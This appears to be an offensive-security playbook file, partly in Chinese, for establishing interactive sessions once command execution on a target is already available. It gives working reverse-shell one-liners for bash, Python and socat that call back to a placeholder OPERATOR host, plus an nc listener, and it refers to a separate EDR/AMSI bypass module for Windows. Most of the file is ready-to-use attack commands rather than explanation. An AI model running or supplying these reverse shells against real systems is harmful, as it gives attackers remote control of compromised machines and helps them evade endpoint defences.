# Session Bootstrap from Existing Command Execution

## 1. 边界

本文件只有在**已有 command execution**时使用。它不包含漏洞利用、认证绕过或 lateral movement。

## 2. Linux callback primitives

Bash：

```bash
bash -c 'bash -i >& /dev/tcp/OPERATOR/4444 0>&1'
```

Python3：

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("OPERATOR",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'
```

socat（目标存在时）：

```bash
socat TCP:OPERATOR:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

## 3. Windows

优先使用当前 engagement 已选定的 payload/session primitive；不要在 `/shell` 内重新实现 EDR bypass loader。

如果 PowerShell 可用且未被端点防护阻断，可以建立当前测试需要的 TCP/ConPTY channel；若 PowerShell/loader 被 AMSI/EDR 明确拦截，再选择 `/edr-bypass`。

## 4. Listener

```bash
rlwrap nc -lvnp 4444
```

如果使用框架 payload，handler 必须与原 Attack 模块生成的 payload 完全匹配。
